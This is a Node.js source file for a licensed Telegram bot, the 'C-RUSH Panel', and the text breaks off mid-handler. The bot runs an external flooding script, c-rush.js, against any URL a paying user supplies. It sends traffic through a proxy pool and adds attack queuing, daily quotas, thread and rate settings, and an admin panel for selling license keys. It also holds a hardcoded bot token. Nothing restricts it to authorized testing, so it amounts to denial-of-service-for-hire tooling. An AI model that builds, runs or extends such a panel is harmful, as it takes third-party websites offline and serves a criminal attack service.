'use strict';

const fs   = require('fs');
const os   = require('os');
const path = require('path');
const { spawn } = require('child_process');
const TelegramBot = require('node-telegram-bot-api');

// defensive import
const Bot = typeof TelegramBot === 'function'
    ? TelegramBot
    : (TelegramBot && (TelegramBot.default || TelegramBot.TelegramBot)) || null;
if (typeof Bot !== 'function') {
    throw new Error('node-telegram-bot-api did not export a constructor. Run: npm i node-telegram-bot-api@0.66.0');
}

// =============================================================
//  CONFIG
// =============================================================
const CONFIG = {
    OWNER_ID:   8872751291,
    BOT_TOKEN:  '9030160105:AAFRI9E76I6QRx9n14y6VCgm7jgrzhqA94Q',

    SCRIPT_PATH: 'c-rush.js',

    // per-attack input ceilings
    MAX_ATTACK_DURATION:     120,   // 10 min per attack
    HARD_MAX_THREADS:        100,   // per attack
    HARD_MAX_RATE:           200,   // req/sec per thread

    // global scheduling budgets (fair-play + memory safety)
    MAX_CONCURRENT_ATTACKS:  20,    // 10 users × 2 concurrent headroom
    MAX_TOTAL_THREADS:       400,   // total cluster workers across all attacks
    MAX_QUEUE_SIZE:          50,    // pending attacks buffer
    MIN_FREE_MEM_MB:         256,   // don't accept new attacks below this

    DATA_DIR: path.join(__dirname, 'data'),
    TMP_DIR:  path.join(__dirname, 'data', 'tmp'),
};

// =============================================================
//  ENV CHECK (deps for c-rush.js)
// =============================================================
(function checkDeps() {
    const required = ['colors', 'node-bash-title', 'hpack', 'axios'];
    const missing = [];
    for (const dep of required) {
        try { require.resolve(dep); } catch { missing.push(dep); }
    }
    if (missing.length) {
        console.error('\n⚠️  Missing c-rush.js dependencies:');
        for (const m of missing) console.error('   • ' + m);
        console.error('\n   Fix: npm i ' + missing.join(' ') + '\n');
        process.exit(1);
    }
    if (!fs.existsSync(path.join(__dirname, CONFIG.SCRIPT_PATH))) {
        console.error(`\n⚠️  ${CONFIG.SCRIPT_PATH} not found in ${__dirname}\n`);
        process.exit(1);
    }
})();

// =============================================================
//  STORAGE
// =============================================================
if (!fs.existsSync(CONFIG.DATA_DIR)) fs.mkdirSync(CONFIG.DATA_DIR, { recursive: true });
if (!fs.existsSync(CONFIG.TMP_DIR))  fs.mkdirSync(CONFIG.TMP_DIR,  { recursive: true });

const FILES = {
    users:    path.join(CONFIG.DATA_DIR, 'users.json'),
    licenses: path.join(CONFIG.DATA_DIR, 'licenses.json'),
    admins:   path.join(CONFIG.DATA_DIR, 'admins.json'),
    stats:    path.join(CONFIG.DATA_DIR, 'stats.json'),
    proxies:  path.join(CONFIG.DATA_DIR, 'proxies.txt'),
};

const loadJSON = (f, d) => { try { return JSON.parse(fs.readFileSync(f, 'utf8')); } catch { return d; } };
const saveJSON = (f, d) => { try { fs.writeFileSync(f, JSON.stringify(d, null, 2)); } catch (e) { console.error(e); } };

let users    = loadJSON(FILES.users, {});
let licenses = loadJSON(FILES.licenses, {});
let admins   = loadJSON(FILES.admins, []);
let stats    = loadJSON(FILES.stats, { totalAttacks: 0, totalUsers: 0, totalLicenses: 0 });

// migrate legacy proxy files
(function migrateProxies() {
    const legacyPlural   = path.join(__dirname, 'proxies.txt');
    const legacySingular = path.join(CONFIG.DATA_DIR, 'proxy.txt');
    const target         = FILES.proxies;
    if (fs.existsSync(target)) return;
    if (fs.existsSync(legacyPlural))   { try { fs.copyFileSync(legacyPlural,   target); return; } catch {} }
    if (fs.existsSync(legacySingular)) { try { fs.copyFileSync(legacySingular, target); return; } catch {} }
    fs.writeFileSync(target, '');
})();

// =============================================================
//  RUNTIME STATE
// =============================================================
const userState      = new Map();
const activeAttacks  = new Map();
const attackQueue    = [];
let   attackCounter  = 0;
let   totalActiveThreads = 0;

// =============================================================
//  HELPERS
// =============================================================
const now = () => Date.now();
const DAY = 86400000;
const isOwner = id => Number(id) === CONFIG.OWNER_ID;
const isAdmin = id => isOwner(id) || admins.includes(Number(id));
const esc = s => String(s).replace(/[_*`\[\]()~>#+\-=|{}.!]/g, m => '\\' + m);

function getUser(id) {
    const k = String(id);
    if (!users[k]) {
        users[k] = {
            id: Number(id), username: '', firstName: '',
            joinedAt: now(), licenseKey: null, activatedAt: null, expiresAt: null,
            banned: false, totalAttacks: 0,
            daily: { date: '', count: 0 },
            lastAttackAt: 0,
        };
    }
    const u = users[k];
    if (!u.daily) u.daily = { date: '', count: 0 };
    if (typeof u.lastAttackAt !== 'number') u.lastAttackAt = 0;
    return u;
}

function todayStr() {
    const d = new Date();
    return `${d.getUTCFullYear()}-${String(d.getUTCMonth()+1).padStart(2,'0')}-${String(d.getUTCDate()).padStart(2,'0')}`;
}

function resetDailyIfNeeded(u) {
    const t = todayStr();
    if (u.daily.date !== t) { u.daily.date = t; u.daily.count = 0; }
}

function getLicenseForUser(userId) {
    const u = users[String(userId)];
    if (!u || !u.licenseKey) return null;
    return licenses[u.licenseKey] || null;
}

function isLicensed(id) {
    const u = users[String(id)];
    if (!u || u.banned) return false;
    return u.expiresAt && u.expiresAt > now();
}

function fmtDate(ts) {
    if (!ts) return '—';
    return new Date(ts).toISOString().replace('T', ' ').slice(0, 16) + ' UTC';
}

function genLicenseKey() {
    const seg = () => Math.random().toString(36).substring(2, 6).toUpperCase().padEnd(4, 'X');
    return `RUSH-${seg()}-${seg()}-${seg()}-${seg()}`;
}

function freeMemMB() {
    return Math.round(os.freemem() / 1048576);
}

// proxy line parser
const PROXY_RE = /^[A-Za-z0-9_.\-]+:\d{1,5}$/;
function parseProxyLines(raw) {
    return String(raw)
        .split(/\r?\n/)
        .map(l => l.trim())
        .filter(l => l.length > 0 && !l.startsWith('#'))
        .map(l => l.replace(/^(?:https?|socks[45]?):\/\//i, ''))
        .filter(l => PROXY_RE.test(l));
}

// =============================================================
//  PROXY POOL MERGE / REPLACE
// =============================================================
function mergeProxies(newLines, mode) {
    let existing = [];
    try {
        existing = fs.readFileSync(FILES.proxies, 'utf8')
            .split('\n').map(l => l.trim()).filter(Boolean);
    } catch {}

    let finalList;
    if (mode === 'replace') {
        finalList = [...new Set(newLines)];
    } else {
        finalList = [...new Set([...existing, ...newLines])];
    }

    fs.writeFileSync(FILES.proxies, finalList.join('\n'));

    const added = finalList.length - existing.length;
    const dupes = mode === 'add'
        ? (existing.length + newLines.length - finalList.length)
        : (newLines.length - finalList.length);

    return {
        submitted: newLines.length,
        added: Math.max(0, added),
        dupes: Math.max(0, dupes),
        total: finalList.length,
        mode,
    };
}

// =============================================================
//  PERMISSION CHECK (per-user)
// =============================================================
function checkUserPermission(userId) {
    const u = getUser(userId);
    const lic = getLicenseForUser(userId);

    if (!u.expiresAt || u.expiresAt <= now())
        return { ok: false, reason: 'Your license has expired. Contact admin.' };

    resetDailyIfNeeded(u);
    const dailyLimit = lic?.dailyLimit ?? 5;
    if (u.daily.count >= dailyLimit)
        return { ok: false, reason: `Daily attack limit reached (${u.daily.count}/${dailyLimit}). Resets at 00:00 UTC.` };

    const cooldownMs = (lic?.cooldownSeconds ?? 60) * 1000;
    const remain = u.lastAttackAt + cooldownMs - now();
    if (remain > 0)
        return { ok: false, reason: `Cooldown active: wait ${Math.ceil(remain/1000)}s before next attack.` };

    const concurrent = [...activeAttacks.values()].filter(a => a.userId === userId).length;
    const maxConc = lic?.maxConcurrent ?? 1;
    if (concurrent >= maxConc)
        return { ok: false, reason: `Concurrent attack limit reached (${concurrent}/${maxConc}). Wait for one to finish.` };

    return { ok: true, license: lic, user: u };
}

// =============================================================
//  GLOBAL SLOT ACQUISITION (fair-share)
// =============================================================
function canAcquireSlot(threads) {
    if (activeAttacks.size >= CONFIG.MAX_CONCURRENT_ATTACKS) return false;
    if (totalActiveThreads + threads > CONFIG.MAX_TOTAL_THREADS) return false;
    if (freeMemMB() < CONFIG.MIN_FREE_MEM_MB) return false;
    return true;
}

function enqueueAttack(entry) {
    if (attackQueue.length >= CONFIG.MAX_QUEUE_SIZE) return { ok: false, reason: 'Queue full. Try again in a minute.' };
    entry.queuedAt = now();
    attackQueue.push(entry);
    return { ok: true, position: attackQueue.length };
}

function removeFromQueueByUser(userId) {
    for (let i = attackQueue.length - 1; i >= 0; i--) {
        if (attackQueue[i].userId === userId) {
            attackQueue.splice(i, 1);
        }
    }
}

function drainQueue() {
    while (attackQueue.length > 0) {
        const head = attackQueue[0];
        if (!canAcquireSlot(head.threads)) return;

        const perm = checkUserPermission(head.userId);
        if (!perm.ok) {
            attackQueue.shift();
            try { head.reply(`❌ Queued attack dropped: ${perm.reason}`); } catch {}
            continue;
        }

        attackQueue.shift();
        spawnAttackNow(head);
    }
}

// =============================================================
//  SPAWN
// =============================================================
function spawnAttackNow(entry) {
    const { chatId, userId, target, duration, threads, rate, options, reply } = entry;

    const scriptPath = path.join(__dirname, CONFIG.SCRIPT_PATH);
    const proxyPath  = FILES.proxies;

    if (!fs.existsSync(scriptPath)) { try { reply('❌ c-rush.js missing.'); } catch {} return null; }
    if (!fs.existsSync(proxyPath) || fs.statSync(proxyPath).size < 5) { try { reply('❌ Proxy pool empty. Contact admin.'); } catch {} return null; }

    const args = [
        CONFIG.SCRIPT_PATH,
        target,
        String(duration),
        proxyPath,
        String(threads),
        String(rate),
    ];
    if (options.cookies)  args.push('-c');
    if (options.headfull) args.push('-h');
    if (options.silent)   args.push('-s');
    if (options.version)  args.push('-v', String(options.version));
    args.push('-ch', options.cache ? 'true' : 'false');

    const proc = spawn('node', args, {
        cwd: __dirname,
        stdio: ['ignore', 'pipe', 'pipe'],
        env: { ...process.env, FORCE_COLOR: '0' },
    });

    const attackId = ++attackCounter;
    const endTime  = now() + duration * 1000;

    totalActiveThreads += threads;

    let stderrBuf = '';
    let stdoutBuf = '';
    proc.stderr.on('data', d => {
        stderrBuf += d.toString();
        if (stderrBuf.length > 16000) stderrBuf = stderrBuf.slice(-16000);
    });
    proc.stdout.on('data', d => {
        stdoutBuf += d.toString();
        if (stdoutBuf.length > 16000) stdoutBuf = stdoutBuf.slice(-16000);
    });

    const killTimer = setTimeout(() => {
        if (activeAttacks.has(attackId)) {
            try { proc.kill('SIGKILL'); } catch {}
        }
    }, (duration + 15) * 1000);

    activeAttacks.set(attackId, {
        id: attackId, chatId, userId, target, duration, threads, rate, options,
        proc, endTime, startedAt: now(), killTimer,
    });

    const u = getUser(userId);
    resetDailyIfNeeded(u);
    u.daily.count += 1;
    u.lastAttackAt = now();
    u.totalAttacks = (u.totalAttacks || 0) + 1;
    saveJSON(FILES.users, users);

    stats.totalAttacks = (stats.totalAttacks || 0) + 1;
    saveJSON(FILES.stats, stats);

    proc.on('exit', code => {
        clearTimeout(killTimer);
        activeAttacks.delete(attackId);
        totalActiveThreads -= threads;
        if (totalActiveThreads < 0) totalActiveThreads = 0;

        let errorTail = '';
        if (code !== 0) {
            const src = (stderrBuf.trim() || stdoutBuf.trim());
            if (src) {
                const lines = src.split('\n').slice(-12).join('\n');
                errorTail = `\n\n📋 Last error:\n\`\`\`\n${lines}\n\`\`\``;
            }
        }

        const msg =
            `✅ *Attack #${attackId} finished*\n` +
            `🎯 \`${target}\`\n` +
            `⏱ ${duration}s — exit ${code}${errorTail}`;

        bot.sendMessage(chatId, msg.length > 4000 ? msg.slice(0, 3990) + '\n...' : msg,
            { parse_mode: 'Markdown' }
        ).catch(() => {
            const plain =
                `Attack #${attackId} finished (exit ${code})\n` +
                `Target: ${target}\n\n` +
                ((stderrBuf.trim() || stdoutBuf.trim()).split('\n').slice(-12).join('\n') || '');
            bot.sendMessage(chatId, plain.slice(0, 4000)).catch(() => {});
        });

        setImmediate(drainQueue);
    });

    proc.on('error', err => {
        totalActiveThreads -= threads;
        if (totalActiveThreads < 0) totalActiveThreads = 0;
        bot.sendMessage(chatId, `❌ Launch error: ${esc(err.message)}`).catch(() => {});
    });

    const flagsOn = [];
    if (options.cookies)  flagsOn.push('cookies');
    if (options.headfull) flagsOn.push('headfull');
    if (options.silent)   flagsOn.push('silent');
    if (options.cache)    flagsOn.push('cache');

    const lic = getLicenseForUser(userId);
    const dailyLeft = (lic?.dailyLimit ?? 5) - u.daily.count;
    const cd = lic?.cooldownSeconds ?? 60;

    reply(
        `🚀 *Attack #${attackId} started*\n\n` +
        `🎯 Target: \`${target}\`\n` +
        `⏱ Duration: ${duration}s\n` +
        `🧵 Threads: ${threads}\n` +
        `⚡ Rate: ${rate}/thread\n` +
        `🔧 Flags: ${flagsOn.join(', ') || '—'} | HTTP v${options.version || '2'}\n\n` +
        `📊 *Your Quota*\n` +
        `• Daily: ${u.daily.count}/${lic?.dailyLimit ?? 5} (${dailyLeft} left)\n` +
        `• Cooldown: ${cd}s\n\n` +
        `🏊 *Pool*\n` +
        `• Active attacks: ${activeAttacks.size}/${CONFIG.MAX_CONCURRENT_ATTACKS}\n` +
        `• Active threads: ${totalActiveThreads}/${CONFIG.MAX_TOTAL_THREADS}\n` +
        `• Queue: ${attackQueue.length}`
    );

    return attackId;
}

// =============================================================
//  PUBLIC START — spawn or queue
// =============================================================
function startAttack(chatId, userId, target, duration, threads, rate, options, reply) {
    const perm = checkUserPermission(userId);
    if (!perm.ok) return reply(`❌ ${perm.reason}`);

    const entry = { chatId, userId, target, duration, threads, rate, options, reply };

    if (canAcquireSlot(threads)) {
        return spawnAttackNow(entry);
    }

    const q = enqueueAttack(entry);
    if (!q.ok) return reply(`❌ ${q.reason}`);

    return reply(
        `⏳ *Queued for launch*\n\n` +
        `🎯 Target: \`${target}\`\n` +
        `⏱ ${duration}s | 🧵 ${threads} threads | ⚡ ${rate}\n\n` +
        `📌 Position in queue: *${q.position}*\n` +
        `Your attack starts automatically when a slot frees up.\n\n` +
        `To cancel: /cancelqueue`
    );
}

// =============================================================
//  KEYBOARDS
// =============================================================
function mainMenuKeyboard(userId) {
    const rows = [
        [{ text: '🚀 New Attack',        callback_data: 'menu_attack' }],
        [{ text: '📊 My Active Attacks', callback_data: 'menu_active' }],
        [{ text: '🔑 License Info',      callback_data: 'menu_license' }],
    ];
    if (isAdmin(userId)) rows.push([{ text: '🛡 Admin Panel', callback_data: 'menu_admin' }]);
    return { inline_keyboard: rows };
}

function adminMenuKeyboard() {
    return {
        inline_keyboard: [
            [{ text: '📊 Stats',            callback_data: 'adm_stats' },
             { text: '👥 Users',            callback_data: 'adm_users' }],
            [{ text: '🔑 Create License',   callback_data: 'adm_gen_license' },
             { text: '📋 Licenses',         callback_data: 'adm_licenses' }],
            [{ text: '🚫 Ban User',         callback_data: 'adm_ban' },
             { text: '✅ Unban User',       callback_data: 'adm_unban' }],
            [{ text: '♻️ Reset Cooldown',   callback_data: 'adm_reset_cd' }],
            [{ text: '👤 Add Admin',        callback_data: 'adm_add_admin' },
             { text: '🗑 Remove Admin',     callback_data: 'adm_rm_admin' }],
            [{ text: '➕ Add Proxies',      callback_data: 'adm_proxies_add' },
             { text: '♻️ Replace Proxies',  callback_data: 'adm_proxies_replace' }],
            [{ text: '📈 Proxy Count',      callback_data: 'adm_proxies_count' }],
            [{ text: '🌐 Scrape Proxies',   callback_data: 'adm_proxies_scrape' }],
            [{ text: '🏊 Pool Status',      callback_data: 'adm_pool' }],
            [{ text: '🛑 Stop All Attacks', callback_data: 'adm_stop_all' }],
            [{ text: '📢 Broadcast',        callback_data: 'adm_broadcast' }],
        ]
    };
}

function attackOptionsKeyboard(data) {
    const o = data.options || {};
    const m = v => (v ? '✅ ' : '❌ ');
    return {
        inline_keyboard: [
            [{ text: m(o.cookies)  + 'Cookies',  callback_data: 'opt_cookies'  },
             { text: m(o.headfull) + 'Headfull', callback_data: 'opt_headfull' }],
            [{ text: m(o.cache)    + 'Cache',    callback_data: 'opt_cache'    },
             { text: m(o.silent)   + 'Silent',   callback_data: 'opt_silent'   }],
            [{ text: '🌐 HTTP v' + (o.version || '2'), callback_data: 'opt_version' }],
            [{ text: '✅ Confirm & Start', callback_data: 'opt_confirm' },
             { text: '❌ Cancel',          callback_data: 'opt_cancel'  }],
        ]
    };
}

// =============================================================
//  BOT INIT
// =============================================================
const bot = new Bot(CONFIG.BOT_TOKEN, { polling: true });

bot.setMyCommands([
    { command: 'start',       description: 'Start / Main menu' },
    { command: 'attack',      description: 'Quick attack: /attack <target> [dur] [threads] [rate] [flags]' },
    { command: 'active',      description: 'My active attacks' },
    { command: 'quota',       description: 'Check cooldown + daily quota' },
    { command: 'cancel',      description: 'Cancel current operation' },
    { command: 'cancelqueue', description: 'Cancel my queued attacks' },
    { command: 'admin',       description: 'Admin panel (admin only)' },
]).catch(() => {});

// =============================================================
//  /start
// =============================================================
bot.onText(/^\/start(?:@\w+)?(?:\s|$)/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const u = getUser(userId);
    u.username  = msg.from.username || u.username;
    u.firstName = msg.from.first_name || u.firstName;
    saveJSON(FILES.users, users);

    if (u.banned) return bot.sendMessage(chatId, '⛔️ You are banned from this bot.');

    if (!isLicensed(userId)) {
        userState.set(chatId, { step: 'await_license', data: {} });
        return bot.sendMessage(chatId,
            `⚡ *C-RUSH Panel*\n\n` +
            `Welcome ${esc(msg.from.first_name || 'friend')} 👋\n\n` +
            `🔑 Send your license key to activate.\n\n` +
            `📝 Format: \`RUSH-XXXX-XXXX-XXXX-XXXX\``,
            { parse_mode: 'Markdown' }
        );
    }

    const lic = getLicenseForUser(userId);
    resetDailyIfNeeded(u);
    saveJSON(FILES.users, users);

    const daysLeft = Math.max(0, Math.ceil((u.expiresAt - now()) / DAY));
    const cdRemain = Math.max(0, Math.ceil((u.lastAttackAt + (lic?.cooldownSeconds ?? 60)*1000 - now()) / 1000));

    bot.sendMessage(chatId,
        `⚡ *C-RUSH Panel*\n\n` +
        `👤 User ID: \`${userId}\`\n` +
        `📅 License valid: ${daysLeft} day(s)\n` +
        `📊 Daily quota: ${u.daily.count}/${lic?.dailyLimit ?? 5}\n` +
        `⏳ Cooldown: ${cdRemain > 0 ? cdRemain + 's remaining' : 'ready'}\n` +
        `🏊 Pool: ${activeAttacks.size}/${CONFIG.MAX_CONCURRENT_ATTACKS} active | ${attackQueue.length} queued\n\n` +
        `Choose from the menu:`,
        { parse_mode: 'Markdown', reply_markup: mainMenuKeyboard(userId) }
    );
});

// =============================================================
//  /quota
// =============================================================
bot.onText(/^\/quota/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isLicensed(userId)) return bot.sendMessage(chatId, '❌ No active license.');
    const u = getUser(userId);
    const lic = getLicenseForUser(userId);
    resetDailyIfNeeded(u);
    saveJSON(FILES.users, users);

    const cdRemain = Math.max(0, Math.ceil((u.lastAttackAt + (lic?.cooldownSeconds ?? 60)*1000 - now()) / 1000));
    const dailyLeft = (lic?.dailyLimit ?? 5) - u.daily.count;

    bot.sendMessage(chatId,
        `📊 *Your Quota*\n\n` +
        `• Daily: ${u.daily.count}/${lic?.dailyLimit ?? 5} used — ${dailyLeft} left\n` +
        `• Cooldown: ${cdRemain > 0 ? cdRemain + 's remaining' : '✅ ready'}\n` +
        `• Concurrent limit: ${lic?.maxConcurrent ?? 1}\n` +
        `• Resets daily at 00:00 UTC\n\n` +
        `🏊 *Pool*\n` +
        `• Active attacks: ${activeAttacks.size}/${CONFIG.MAX_CONCURRENT_ATTACKS}\n` +
        `• Active threads: ${totalActiveThreads}/${CONFIG.MAX_TOTAL_THREADS}\n` +
        `• Queue: ${attackQueue.length}\n` +
        `• Free RAM: ${freeMemMB()} MB`,
        { parse_mode: 'Markdown' }
    );
});

// =============================================================
//  /admin
// =============================================================
bot.onText(/^\/admin/, (msg) => {
    if (!isAdmin(msg.from.id)) return;
    bot.sendMessage(msg.chat.id, '🛡 *Admin Panel*', {
        parse_mode: 'Markdown', reply_markup: adminMenuKeyboard()
    });
});

// =============================================================
//  /active
// =============================================================
bot.onText(/^\/active/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const list = [...activeAttacks.values()].filter(a => a.userId === userId);
    if (!list.length) return bot.sendMessage(chatId, '📭 No active attacks.');
    const kb = { inline_keyboard: [] };
    let txt = '📊 *Your Active Attacks*\n\n';
    for (const a of list) {
        const rem = Math.max(0, Math.floor((a.endTime - now()) / 1000));
        txt += `#${a.id} → \`${a.target}\` — ${rem}s (${a.threads}t)\n`;
        kb.inline_keyboard.push([{ text: `🛑 Stop #${a.id}`, callback_data: `stop_${a.id}` }]);
    }
    bot.sendMessage(chatId, txt, { parse_mode: 'Markdown', reply_markup: kb });
});

// =============================================================
//  /cancel
// =============================================================
bot.onText(/^\/cancel/, (msg) => {
    userState.delete(msg.chat.id);
    bot.sendMessage(msg.chat.id, '❌ Operation cancelled.');
});

// =============================================================
//  /cancelqueue
// =============================================================
bot.onText(/^\/cancelqueue/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const before = attackQueue.length;
    removeFromQueueByUser(userId);
    const after = attackQueue.length;
    const removed = before - after;
    bot.sendMessage(chatId, removed > 0
        ? `🛑 Cancelled ${removed} queued attack(s).`
        : '📭 You have no queued attacks.');
});

// =============================================================
//  /attack (one-liner)
// =============================================================
bot.onText(/^\/attack(?:\s+(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isLicensed(userId)) return bot.sendMessage(chatId, '❌ No active license.');
    const raw = (match[1] || '').trim();
    if (!raw) {
        userState.set(chatId, { step: 'attack_target', data: {} });
        return bot.sendMessage(chatId, '🎯 Send target URL:');
    }
    const parts = raw.split(/\s+/);
    let target = parts[0];
    if (!/^https?:\/\//i.test(target)) target = 'https://' + target;
    const dur  = Math.min(parseInt(parts[1]) || 60, CONFIG.MAX_ATTACK_DURATION);
    const thr  = Math.min(parseInt(parts[2]) || 20, CONFIG.HARD_MAX_THREADS);
    const rate = Math.min(parseInt(parts[3]) || 64, CONFIG.HARD_MAX_RATE);
    const flags = parts.slice(4);
    const options = {
        cookies:  flags.includes('-c'),
        headfull: flags.length === 0 || flags.includes('-h'),
        cache:    !flags.includes('-chfalse'),
        silent:   flags.length === 0 || flags.includes('-s'),
        version:  flags.includes('-v1') ? '1' : '2',
    };
    startAttack(chatId, userId, target, dur, thr, rate, options,
        t => bot.sendMessage(chatId, t, { parse_mode: 'Markdown' }));
});

// =============================================================
//  DOCUMENT HANDLER — .txt proxy upload (FIXED)
// =============================================================
bot.on('document', async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const st = userState.get(chatId);

    if (!st || st.step !== 'adm_proxies') {
        return bot.sendMessage(chatId,
            '📎 To upload a proxy list, open *Admin Panel → Add/Replace Proxies* first, then send the .txt file.',
            { parse_mode: 'Markdown' }
        );
    }
    if (!isAdmin(userId)) return bot.sendMessage(chatId, '⛔ Access denied.');

    const doc  = msg.document;
    const name = (doc.file_name || '').toLowerCase();
    if (!name.endsWith('.txt')) return bot.sendMessage(chatId, '❌ Only `.txt` files are accepted.');
    if (doc.file_size && doc.file_size > 5 * 1024 * 1024) return bot.sendMessage(chatId, '❌ File too big (max 5 MB).');

    let downloadedPath = null;

    try {
        // downloadFile returns the FULL PATH
        downloadedPath = await bot.downloadFile(doc.file_id, CONFIG.TMP_DIR);

        if (!downloadedPath || !fs.existsSync(downloadedPath)) {
            throw new Error('downloadFile returned no path');
        }

        const raw   = fs.readFileSync(downloadedPath, 'utf8');
        const lines = parseProxyLines(raw);

        try { fs.unlinkSync(downloadedPath); } catch {}
        downloadedPath = null;

        if (!lines.length) {
            userState.delete(chatId);
            return bot.sendMessage(chatId,
                '❌ No valid proxies found in file.\n\nExpected format: `host:port` on each line.',
                { parse_mode: 'Markdown' }
            );
        }

        const mode   = st.data.mode || 'add';
        const result = mergeProxies(lines, mode);
        userState.delete(chatId);

        return bot.sendMessage(chatId,
            `✅ *Proxies updated from file*\n\n` +
            `📄 File: \`${esc(doc.file_name)}\`\n` +
            `📥 Valid lines: ${result.submitted}\n` +
            `➕ Added: ${result.added}\n` +
            `♻️ Mode: ${result.mode === 'replace' ? 'REPLACED' : 'MERGED'}\n` +
            (result.dupes > 0 ? `🔁 Duplicates skipped: ${result.dupes}\n` : '') +
            `📊 Total in pool: *${result.total}*\n` +
            `📁 File: \`data/proxies.txt\``,
            { parse_mode: 'Markdown', reply_markup: adminMenuKeyboard() }
        );
    } catch (err) {
        try { if (downloadedPath && fs.existsSync(downloadedPath)) fs.unlinkSync(downloadedPath); } catch {}
        try {
            fs.readdirSync(CONFIG.TMP_DIR)
                .filter(f => f.includes(doc.file_id))
                .forEach(f => { try { fs.unlinkSync(path.join(CONFIG.TMP_DIR, f)); } catch {} });
        } catch {}
        userState.delete(chatId);
        return bot.sendMessage(chatId,
            `❌ Upload failed: ${esc(err.message)}\n\n` +
            `💡 Alternative: paste proxy lines directly as text (one \`host:port\` per line).`,
            { parse_mode: 'Markdown' }
        );
    }
});

// =============================================================
//  MESSAGE HANDLER
// =============================================================
bot.on('message', async (msg) => {
    if (!msg.text || msg.text.startsWith('/')) return;
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const st = userState.get(chatId);
    if (!st) return;

    // ---- License activation ----
    if (st.step === 'await_license') {
        const code = msg.text.trim().toUpperCase();
        const lic = licenses[code];
        if (!lic) return bot.sendMessage(chatId, '❌ Invalid license key.');
        if (lic.expiresAt && lic.expiresAt < now()) return bot.sendMessage(chatId, '❌ This license has expired.');
        if ((lic.usedCount || 0) >= lic.maxUses) return bot.sendMessage(chatId, '❌ This license is fully used.');

        lic.usedCount = (lic.usedCount || 0) + 1;
        lic.usedBy = lic.usedBy || [];
        lic.usedBy.push({ userId, at: now() });
        saveJSON(FILES.licenses, licenses);

        const u = getUser(userId);
        const startFrom = Math.max(now(), u.expiresAt || 0);
        u.licenseKey   = code;
        u.activatedAt  = now();
        u.expiresAt    = startFrom + lic.durationDays * DAY;
        u.daily        = { date: todayStr(), count: 0 };
        u.lastAttackAt = 0;
        saveJSON(FILES.users, users);

        userState.delete(chatId);
        await bot.sendMessage(chatId,
            `✅ *License activated!*\n\n` +
            `📅 Duration: ${lic.durationDays} day(s)\n` +
            `📊 Daily limit: ${lic.dailyLimit ?? 5} attacks\n` +
            `⏳ Cooldown: ${lic.cooldownSeconds ?? 60}s\n` +
            `🧵 Concurrent: ${lic.maxConcurrent ?? 1}`,
            { parse_mode: 'Markdown' });
        return bot.sendMessage(chatId, 'Choose from the menu:',
            { reply_markup: mainMenuKeyboard(userId) });
    }

    // ---- Attack wizard ----
    if (st.step === 'attack_target') {
        let t = msg.text.trim();
        if (!/^https?:\/\//i.test(t)) t = 'https://' + t;
        try {
            const u = new URL(t);
            if (!u.hostname) throw new Error();
            st.data.target = t;
            st.step = 'attack_duration';
            return bot.sendMessage(chatId, `⏱ Duration in seconds (1 - ${CONFIG.MAX_ATTACK_DURATION}):`);
        } catch {
            return bot.sendMessage(chatId, '❌ Invalid URL. Try again:');
        }
    }

    if (st.step === 'attack_duration') {
        const d = parseInt(msg.text.trim());
        if (!d || d < 1 || d > CONFIG.MAX_ATTACK_DURATION)
            return bot.sendMessage(chatId, `❌ Must be 1 - ${CONFIG.MAX_ATTACK_DURATION}.`);
        st.data.duration = d;
        st.step = 'attack_threads';
        return bot.sendMessage(chatId,
            `🧵 Threads (1 - ${CONFIG.HARD_MAX_THREADS}):\n💡 20 threads each is safe for 10 simultaneous users.`,
            { reply_markup: { inline_keyboard: [[{ text: 'Use default (20)', callback_data: 'def_threads' }]] } });
    }

    if (st.step === 'attack_threads') {
        const t = parseInt(msg.text.trim());
        if (!t || t < 1 || t > CONFIG.HARD_MAX_THREADS)
            return bot.sendMessage(chatId, `❌ Must be 1 - ${CONFIG.HARD_MAX_THREADS}.`);
        st.data.threads = t;
        st.step = 'attack_rate';
        return bot.sendMessage(chatId,
            `⚡ Rate per thread (1 - ${CONFIG.HARD_MAX_RATE}):`,
            { reply_markup: { inline_keyboard: [[{ text: 'Use default (64)', callback_data: 'def_rate' }]] } });
    }

    if (st.step === 'attack_rate') {
        const r = parseInt(msg.text.trim());
        if (!r || r < 1 || r > CONFIG.HARD_MAX_RATE)
            return bot.sendMessage(chatId, `❌ Must be 1 - ${CONFIG.HARD_MAX_RATE}.`);
        st.data.rate = r;
        st.data.options = { cookies: false, headfull: true, cache: true, silent: true, version: '2' };
        st.step = 'attack_options';
        return bot.sendMessage(chatId, '🔧 Configure options:',
            { reply_markup: attackOptionsKeyboard(st.data) });
    }

    // ---- License creation flow ----
    if (st.step === 'adm_lic_days') {
        if (!isAdmin(userId)) return;
        const d = parseInt(msg.text.trim());
        if (!d || d < 1 || d > 3650) return bot.sendMessage(chatId, '❌ 1 - 3650 days.');
        st.data.days = d;
        st.step = 'adm_lic_uses';
        return bot.sendMessage(chatId, '👥 Max activations:',
            { reply_markup: { inline_keyboard: [
                [{ text: '1', callback_data: 'lic_uses_1' },   { text: '5',  callback_data: 'lic_uses_5' }],
                [{ text: '10', callback_data: 'lic_uses_10' }, { text: '∞',  callback_data: 'lic_uses_inf' }],
            ] } });
    }

    if (st.step === 'adm_lic_daily') {
        if (!isAdmin(userId)) return;
        const d = parseInt(msg.text.trim());
        if (!d || d < 1 || d > 1000) return bot.sendMessage(chatId, '❌ 1 - 1000 attacks/day.');
        st.data.dailyLimit = d;
        st.step = 'adm_lic_cooldown';
        return bot.sendMessage(chatId, '⏳ Cooldown between attacks (seconds, 0 - 86400):');
    }

    if (st.step === 'adm_lic_cooldown') {
        if (!isAdmin(userId)) return;
        const s = parseInt(msg.text.trim());
        if (isNaN(s) || s < 0 || s > 86400) return bot.sendMessage(chatId, '❌ 0 - 86400 seconds.');
        st.data.cooldownSeconds = s;
        st.step = 'adm_lic_concurrent';
        return bot.sendMessage(chatId, '🧵 Max concurrent attacks per user (1 - 10):');
    }

    if (st.step === 'adm_lic_concurrent') {
        if (!isAdmin(userId)) return;
        const c = parseInt(msg.text.trim());
